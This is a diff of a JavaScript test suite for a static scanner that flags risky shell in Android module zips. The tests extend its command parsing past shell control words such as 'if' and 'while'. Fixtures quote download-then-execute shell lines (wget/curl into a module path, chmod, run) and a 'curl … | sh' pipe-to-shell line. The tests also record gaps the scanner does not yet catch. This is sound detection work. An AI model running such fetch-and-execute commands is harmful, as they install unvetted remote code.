@@ -15,7 +15,7 @@ import {
   scoreRisk, decide, countsTowardRisk, SEVERITY_ORDER, CATEGORY_LABEL,
   inspectStructure, unsafePathReason, detectBinary, checkCoverage, checkUnread, checkBinaries,
   MAX_TEXT, MAX_ENTRIES, MAX_RATIO,
-  EXEC_BUNDLED_FILE, EXEC_INDIRECT, PROP_BOOT_SPOOF,
+  EXEC_BUNDLED_FILE, EXEC_INDIRECT, PROP_BOOT_SPOOF, buildLineContexts,
 } from './risk-rules.mjs';
 import { scanZip, classify, renderMarkdown, renderJSON, redactText, mask, resolveChangeType, hasShebang, CANONICAL_SCRIPTS, FLASH_ENTRY_POINTS, readZip, resolveBundledTargets, resolveBundledRefs, normalizeRefPath, EXEC_UNRESOLVED_ADVICE, EXEC_UNPINNED_ADVICE, SCAN_TARGET_BUCKETS } from './scan.mjs';
 import { makeModuleZip, moduleProp, scanToReport } from './fixtures.mjs';
@@ -3899,28 +3899,36 @@ test('T3.1-A4 上限与去重：簇形态的链与既有 -o 形态同表同上�
     'maxPerFile 的基数还是链、还是 20：写法面放宽不许把上限放大');
 });
 
-test('T3.1-A5 记录（交回主控裁定）：逐字 sensitive-props 207/208/215/216 整段仍然 0 命中 —— 挡住的是 216 行行首那个 `if`', () => {
-  // 工单 §4.1 给的期望值是「改后必须 1 命中，落点在 216（执行行）」。跑成的事实是：
-  // §2(a)(b)(c) 三面做完之后 sink 这一半已经看得见（A1 就是它），**执行那一半仍然看不见**，
-  // 原因不在 sink 的写法上，而在执行行的命令位是控制词 `if` ——
-  // 而 §2(b) 自己拍的硬边界（「命令位那个词…末段字面量等于 curl 或 wget 才算」）把 `if` 挡在外面，
-  // 穿透控制词既不在本轮授权的三个写法面里，也撞上代码里那句「本规则不扩这张表；要扩得另开一轮并补夹具」。
-  // 所以这里按真包原样把 0 命中钉成夹具（与上一轮 T3.9「已知限度，不许写成已覆盖」同一做法），
-  // 并留一条**只删三个字符**的对照：谁哪天把控制词穿透了，这两条断言会一起告诉他落点是 216。
+test('T3.1-A5 反向（Task 3.2 主控裁定并授权改写）：逐字 sensitive-props 207/208/215/216 出一条链 —— 落点是 216', () => {
+  // 这一条在上一轮记录的是「三面做完之后仍然 0 命中，挡住的是 216 行行首那个 `if`」（工单 §4.1 的期望值
+  // 当时在授权面内做不到，交回主控）。主控在 Task 3.2 拍了裁定并授权把这一条反过来：
+  // 共享层的命令位改为「逻辑行里第一个不是 shell 控制词的分词」之后，同一篇逐字原文必须说话。
+  // 上一轮留的三条断言的取向因此翻转，其余一字不动 —— 包括那条只删 `if ` 的对照（它现在与主断言同值）。
   const real = [
     T31_SHEBANG,
     '    if wget -qO "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null || \\',
     '       curl -sLo "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null; then',
     '      chmod 755 "$MODPATH/resetprop-rs"',
     '      if "$MODPATH/resetprop-rs" -h >/dev/null 2>&1; then'];
-  assert.deepEqual(t31dte(t31body(...real)), [],
-    '整段逐字（真包 sensitive-props customize.sh 的原样）：DOWNLOAD_THEN_EXEC 今天仍然 0 命中');
-  assert.deepEqual(t31mod(t31body(...real)), [], '同理 DOWNLOAD_TO_MODULE_EXEC 也不报：路径 resetprop-rs 不在模块 system/ 下');
-  // 对照：只把 216 行行首的 `if ` 摘掉（其余一字不动）⇒ 同一条链立刻说话，落点正是工单要的那一行
+  assert.deepEqual(t31dte(t31body(...real)), ['5/high'],
+    '整段逐字（真包 sensitive-props customize.sh 207/208/215/216 的原样）：链说话，落点 = 真包 216 那一行');
+  assert.deepEqual(t31mod(t31body(...real)), [], 'DOWNLOAD_TO_MODULE_EXEC 仍不报：路径 resetprop-rs 不在模块 system/ 下');
+  // sink 那一半仍然是 208 那半句立的（207 的段首是 `if`，本轮没动 dteCollectSinks 的段口径）
+  const [f] = hits('DOWNLOAD_THEN_EXEC', t31body(...real));
+  assert.equal(f.line, 5, '落点在执行行，不在落地行');
+  assert.match(f.snippet, /curl -sLo "\$MODPATH\/resetprop-rs"/, 'snippet 必须带 208 那半句逐字原文');
+  // 同一个包的另一篇：action.sh 210/211/218/219 —— 真包差集里的第二条
+  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
+    '      if wget -qO "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null || \\',
+    '         curl -sLo "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null; then',
+    '        chmod 755 "$MODPATH/resetprop-rs"',
+    '        if "$MODPATH/resetprop-rs" -h >/dev/null 2>&1; then'), 'action.sh'), ['5/high'],
+    'action.sh:219 那一格同理（真包上一轮差集里的第二条）');
+  // 上一轮那条对照留着：只把 216 行行首的 `if ` 摘掉（其余一字不动）⇒ 命中位置不变
   const withoutIf = real.map((l, i) => (i === 4 ? l.replace(/^(\s*)if /, '$1') : l));
   assert.notEqual(withoutIf[4], real[4], '对照必须真的只改了那一个 `if `');
   assert.deepEqual(t31dte(t31body(...withoutIf)), ['5/high'],
-    '唯一挡住这条链的就是行首那个 `if` —— 不是 sink 的写法，也不是路径判据');
+    '摘掉 `if ` 与不摘现在给出同一个落点 —— 穿透控制词之后这一格不再是限度');
 });
 
 // —— §2(b) 命令位末段是 curl/wget：只多收这一格 ——
@@ -4200,3 +4208,191 @@ test('T3.1-D9 老判据一字未动：DOWNLOAD_THEN_EXEC 的 severity/category/p
   assert.deepEqual(hits('PIPE_TO_SHELL', t31body(T31_SHEBANG, 'curl -s https://x.dev/a | sh')).map((f) => f.line), [2]);
   assert.deepEqual(t31dte(t31body(T31_SHEBANG, 'curl -s https://x.dev/a | sh')), []);
 });
+
+// ===========================================================================
+// Task 3.2 —— 命令位要跳过 shell 控制词：挡住真链的是 `if`，不是写法
+// ===========================================================================
+//
+// 上一轮（T3.1）把 DOWNLOAD_THEN_EXEC 的写法面做完之后，sensitive-props 那条真链仍然 0 命中，
+// 唯一原因是 sink 行与执行行的命令位都是控制词 `if`（报告 §9.1 / 夹具 T3.1-A5 记录的就是这一格）。
+// 本轮只动共享层那一个函数 `logicalFirstToken`：命令位 = 逻辑行里**第一个不是 shell 控制词**的分词。
+// 控制词表只有这一份，规则里**不许**再写第二份「跳过 if」的局部逻辑 —— fix6-F1 那条病就是这么来的。
+//
+// 下面每一条正向夹具的原文都逐字取自 `fp-t3/zips/sensitive-props-main-source.zip`
+// （静态读，包内没有一行代码被执行过）：
+//   sensitive-props-main/customize.sh:207/208/215/216
+//   sensitive-props-main/action.sh:210/211/218/219
+//   sensitive-props-main/customize.sh:212 = '    fi'（整行只有控制词那一格）
+
+// —— §2.3 正向：同一条链，前缀换一个控制词 ——
+
+/** 逐字 customize.sh 那四行（207/208/215/216），把两处行首的 `if` 换成 prefix。 */
+const T32_C = [
+  '    if wget -qO "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null || \\',
+  '       curl -sLo "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null; then',
+  '      chmod 755 "$MODPATH/resetprop-rs"',
+  '      if "$MODPATH/resetprop-rs" -h >/dev/null 2>&1; then'];
+/** 逐字 action.sh 那四行（210/211/218/219），同上。 */
+const T32_A = [
+  '      if wget -qO "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null || \\',
+  '         curl -sLo "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null; then',
+  '        chmod 755 "$MODPATH/resetprop-rs"',
+  '        if "$MODPATH/resetprop-rs" -h >/dev/null 2>&1; then'];
+const t32chain = (prefix, base = T32_C) =>
+  t31body(T31_SHEBANG, ...base.map((l) => l.replace(/^(\s*)if(?=\s)/, `$1${prefix}`)));
+/** 逻辑行 head 那一行的命令位（共享层说话，夹具不自己数第一个词）。 */
+const t32cmd = (text, line) => {
+  const ctx = buildLineContexts(text.split('\n'));
+  return ctx[line - 1] ? ctx[line - 1].firstToken : undefined;
+};
+
+test('T3.2-A1 正向（逐字 sensitive-props customize.sh 207/208/215/216 原样）：`if` 站在命令位上时链照样说话', () => {
+  const t = t32chain('if');
+  assert.deepEqual(t31dte(t), ['5/high'],
+    '落点必须是 216 那一行（夹具里的第 5 行，执行行），不是 sink 行');
+  const [f] = hits('DOWNLOAD_THEN_EXEC', t);
+  assert.equal(f.ruleId, 'DOWNLOAD_THEN_EXEC');
+  assert.equal(f.severity, 'high');
+  // sink 那一半仍然由 208 那半句 `curl -sLo` 立：207 的段首是 `if`，穿透控制词不动 dteCollectSinks 的段口径
+  assert.match(f.snippet, /curl -sLo "\$MODPATH\/resetprop-rs"/, 'snippet 必须带 208 那半句逐字原文');
+  assert.match(f.snippet, /chmod 755 "\$MODPATH\/resetprop-rs"/, '215 的 chmod 仍是同一条链的证据');
+  // 落点那一行的逐字原文也在 snippet 里（链的三段用 `->` 串起来；整段受 MAX_SNIPPET=160 截断，
+  // 所以这里匹配的是 `-> if "$MODPATH/resetprop-rs"` 这一截，不是整行）
+  assert.match(f.snippet, /-> if "\$MODPATH\/resetprop-rs"/, '216 的逐字原文（含行首那个 if）必须在 snippet 里');
+  // 同一个包的另一篇文本：action.sh 210/211/218/219 —— 真包上一轮实测的另半条链
+  assert.deepEqual(t31dte(t32chain('if', T32_A), 'action.sh'), ['5/high'],
+    'action.sh:219 那一格同理（真包差集里的第二条）');
+  assert.deepEqual(t31mod(t), [], 'resetprop-rs 不在模块 system/ 下 ⇒ 另一条规则仍不报（判据互不借用）');
+});
+
+test('T3.2-A2 正向：`while` 站在命令位上 ⇒ 同一条链命中，落点不变', () => {
+  assert.deepEqual(t31dte(t32chain('while')), ['5/high'], 'while 前缀的那条链必须与 if 同判');
+  assert.equal(t32cmd(t32chain('while'), 2), 'wget', '命令位由共享层说话：跳过 while 之后是 wget');
+});
+
+test('T3.2-A3 正向：`time` 站在命令位上 ⇒ 同一条链命中，落点不变', () => {
+  assert.deepEqual(t31dte(t32chain('time')), ['5/high'],
+    'time 会把它的第一个参数拿去跑，这一格本来就不该沉默');
+  assert.equal(t32cmd(t32chain('time'), 5), '$MODPATH/resetprop-rs', '执行行的命令位是那条路径');
+});
+
+test('T3.2-A4 正向：`!` 站在命令位上 ⇒ 同一条链命中，落点不变', () => {
+  assert.deepEqual(t31dte(t32chain('!')), ['5/high'], '! 是否定前导词，它后面的词才是命令');
+  assert.equal(t32cmd(t32chain('!'), 2), 'wget', '跳过 ! 之后命令位是 wget');
+});
+
+test('T3.2-A5 正向：控制词表剩下的每一格都必须穿透（until/for/then/else/do/{）', () => {
+  for (const prefix of ['until', 'for', 'then', 'else', 'do', '{']) {
+    assert.deepEqual(t31dte(t32chain(prefix)), ['5/high'], `控制词 ${prefix} 站在命令位上时这条链必须说话`);
+  }
+});
+
+// —— §2.3 那条「现在就命中」的形状：命令替换形态钉成回归哨兵 ——
+
+test('T3.2-B1 回归哨兵（不对称的另一半）：R=$(wget -qO …) 这一格改前改后都命中，命令位仍是 R=$(wget', () => {
+  // `(` 本来就是语句边界符（DTE_SEP），所以命令替换里的 wget 早就站在自己的段首上 ——
+  // 这一格与本轮的控制词表**无关**，它的职责是：将来谁动了边界符处理，这里当场变红。
+  const t = t31body(T31_SHEBANG,
+    'R=$(wget -qO "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET")',
+    '      chmod 755 "$MODPATH/resetprop-rs"',
+    '"$MODPATH/resetprop-rs" -h');
+  assert.deepEqual(t31dte(t), ['4/high'], '命令替换形态：sink 由段首的 wget 立，执行行是第 4 行');
+  assert.equal(t32cmd(t, 2), 'R=$(wget',
+    '控制词表不许把赋值前缀吃掉：`R=$(wget` 不是控制词，命令位就是它自己（穿透只发生在真正的控制词上）');
+});
+
+// —— §2.3 反向夹具：整行只有控制词 ⇒ 命令位上没有任何东西 ——
+
+test('T3.2-C1 反向：整行只有控制词（fi/done/}/then/else）的行不许被当成「有命令在命令位上」', () => {
+  // sensitive-props-main/customize.sh:212 = '    fi'、action.sh:215 = '      fi'（逐字）
+  for (const line of ['    fi', '      fi', 'done', '  done', '}', 'then', 'else', 'do', 'fi \\']) {
+    const t = t31body(T31_SHEBANG, line);
+    assert.equal(t32cmd(t, 2), '', `整行只有控制词 ⇒ 命令位是空的：${JSON.stringify(line)}`);
+  }
+  // 真包那一段原样：fi / done 那些行既不立 sink 也不立执行形态，链只有一条
+  const real = t31body(T31_SHEBANG, T32_C[0], T32_C[1], '        _dl_ok=true', '    else',
+    '      _dl_ok=false', '    fi', T32_C[2], T32_C[3], '    fi');
+  assert.deepEqual(t31dte(real), ['9/high'], '插进真包的 else/fi 那些行之后，链还是只有原来那一条');
+  assert.deepEqual(t31mod(real), [], '另一条规则同样不因为 fi/done 而行进');
+});
+
+test('T3.2-C2 反向：真正的命令词与控制词后面的**参数**都不许被跳掉（表只住控制词）', () => {
+  const cases = [
+    ['wget -qO /data/local/tmp/u https://x.dev/u', 'wget'],   // 下载动词自己站在命令位上：不许被当成控制词跳掉
+    ['curl -sLo /data/local/tmp/v https://x.dev/v', 'curl'],
+    ['chmod 755 "$MODPATH/resetprop-rs"', 'chmod'],            // M2（跳过一切动词）会把 chmod 吃掉 ⇒ 这里红
+    ['sh /data/local/tmp/x', 'sh'],
+    ['rm -rf \\', 'rm'],
+    ['[ -f "$MODPATH/resetprop-rs" ] && [ -x "$MODPATH/resetprop-rs" ]', '['], // 测试位不是控制词
+    ['if [ "$VOL_RESULT" = "up" ]; then', '['],                // 跳过 if 之后停在 [ —— 不再往后走
+    ['if boolval "$_dl_ok"; then', 'boolval'],                 // 逐字 customize.sh:214：穿透 if 之后是那个函数名
+    ['true && wget -qO /data/local/tmp/u "$url"', 'true'],      // && 之后的词归段首口径，不归命令位口径
+    // 赋值前缀：命令位就是这一整段（既有口径只去**外层**引号，词中间的引号留着 —— 本轮没动它）
+    ['RESETPROP_RS_URL="https://x.dev/y"', 'RESETPROP_RS_URL="https://x.dev/y'],
+  ];
+  for (const [line, want] of cases) {
+    assert.equal(t32cmd(t31body(T31_SHEBANG, line), 2), want, `命令位应当停在 ${JSON.stringify(want)}：${line}`);
+  }
+});
+
+test('T3.2-C3 反向：`if [ -f "$MODPATH/x" ]` 这类测试位不算执行（上一轮 §8.1 留的那个问题，本轮的答案是「不算」）', () => {
+  // 控制词表只收 shell 的**保留字**，`[`/`test` 不在表里 ⇒ 穿透 if 之后停在 `[` 上，
+  // 而 `[` 既不是下载器也不是路径，所以测试位里的 sink 与执行目标都不成立。
+  const t = t31body(T31_SHEBANG,
+    '       curl -sLo "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null',
+    '      if [ -f "$MODPATH/resetprop-rs" ] && [ -x "$MODPATH/resetprop-rs" ]; then',
+    '        ui_print "- ok"');
+  assert.deepEqual(t31dte(t), [], '测试位里的同一条路径不许被执行形态说话：本轮没有把 [ 当控制词');
+  assert.equal(t32cmd(t, 3), '[', '穿透 if 之后停在 [ —— 这就是「测试位不算执行」的所在线');
+  assert.deepEqual(t31mod(t), [], '同理另一条规则也不报');
+});
+
+test('T3.2-D1 形状：命令位只有一份实现 —— 控制词表只住在共享层那一处', () => {
+  // 本轮的存在理由：`logicalFirstToken` 是命令位的唯一口径。DOWNLOAD_THEN_EXEC /
+  // DOWNLOAD_TO_MODULE_EXEC 里不许出现「跳过 if」那种局部逻辑，否则就是 fix6-F1 的病复发。
+  const src = readFileSync(new URL('./risk-rules.mjs', import.meta.url), 'utf8');
+  const decl = /const SHELL_CONTROL_WORDS = new Set\(\[([^\]]*)\]\)/.exec(src);
+  assert.ok(decl, '共享层必须有一张具名的控制词表（只改函数体不写表 = 判据没落地，也没有第二处可查）');
+  const words = decl[1].split(',').map((s) => s.trim().replace(/^'|'$/g, '')).filter(Boolean).sort();
+  assert.deepEqual(words, ['!', '{', '}', 'case', 'do', 'done', 'else', 'fi', 'for', 'if', 'select', 'then', 'time', 'until', 'while'].sort(),
+    '表的内容必须逐字等于工单 §1 给的那一张：一格不多（`[`/`test`/`&&`/`exec` 没收），一格不少');
+  assert.equal((src.match(/SHELL_CONTROL_WORDS\.has\(/g) || []).length, 1,
+    '这张表只许被一个地方读：逻辑行命令位那一个函数');
+  assert.equal((src.match(/const SHELL_CONTROL_WORDS = new Set\(/g) || []).length, 1, '这张表只许声明一次');
+});
+
+test('T3.2-D2 让位与顺序判据一字未动：执行行必须晚于落地行，路径仍要求精确相等', () => {
+  // 同一条链把执行行放到 sink 之前 ⇒ 仍然不报（本轮只动命令位，没动顺序判据）
+  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
+    '      if "$MODPATH/resetprop-rs" -h >/dev/null 2>&1; then',
+    '       curl -sLo "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null; then')), [],
+    '执行早于落地 ⇒ 不是这条链：顺序判据没松');
+  // 路径差一个尾段 ⇒ 不报（精确相等没松）
+  assert.deepEqual(t31dte(t31body(T31_SHEBANG, T32_C[0], T32_C[1], T32_C[2],
+    '      if "$MODPATH/resetprop-rsx" -h >/dev/null 2>&1; then')), [], '路径不相等就不是同一条链');
+  // 标准输出继续不立 sink：穿透 if 之后，执行行确实站到了命令位上，但 sink 那一半还是不存在
+  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
+    'wget -qO- /data/local/tmp/u https://x.dev/u',
+    'if /data/local/tmp/u -h; then')), [], '-qO- 是标准输出：命令位穿透不许把它变成落盘');
+  // 让位口径没变：管道那一行仍然只归 PIPE_TO_SHELL，本规则不抢
+  assert.deepEqual(t31dte(t31body(T31_SHEBANG, 'if curl -s https://x.dev/a | sh')), []);
+  // 观察（不是本轮授权面内的改动，改前改后同一个值，写在这儿是为了不让它被当成「已经接住」）：
+  // PIPE_TO_SHELL 的 pattern 要求下载器紧跟在 `^` 或 `[|;&`(]` 之后 ⇒ `if curl … | sh` 这种**控制词前缀**
+  // 的管道今天也是 0 命中。它与本轮修掉的那一格是同一个病，但那张 pattern 本轮一个字没动。
+  assert.deepEqual(hits('PIPE_TO_SHELL', t31body(T31_SHEBANG, 'if curl -s https://x.dev/a | sh')).map((f) => f.line), [],
+    '本轮没动 PIPE_TO_SHELL：控制词前缀的管道形态仍是它自己的限度（已交回主控）');
+  assert.deepEqual(hits('PIPE_TO_SHELL', t31body(T31_SHEBANG, 'curl -s https://x.dev/a | sh')).map((f) => f.line), [2],
+    '没有控制词前缀时它照旧命中：上面那个 0 不是本轮改出来的');
+});
+
+test('T3.2-D3 继续不修的两格：$DOWNLOADER 与 bounded "$BB" wget，前缀换成控制词之后仍然不立 sink', () => {
+  // 工单 §3：这两格本轮继续不修。这里加**控制词前缀**，证明命令位穿透没有顺手把它们做掉。
+  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
+    '    DOWNLOADER=$(command -v curl); DL_MODE="curl"; return',
+    '    if "$DOWNLOADER" -L --fail -o "$ZIP_PATH.tmp" "$URL" 2>/dev/null; then',
+    'sh "$ZIP_PATH.tmp"')), [], '$DOWNLOADER 的末段是 DOWNLOADER：穿透 if 之后仍然不认');
+  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
+    '    if [ -n "$BB" ] && bounded 90 "$BB" wget -q -T 20 -O /data/local/tmp/kb.bin "$3" 2>/dev/null; then',
+    'sh /data/local/tmp/kb.bin')), [], '命令位是 bounded ⇒ 整段词全是参数；本轮没把它做掉');
+});
+
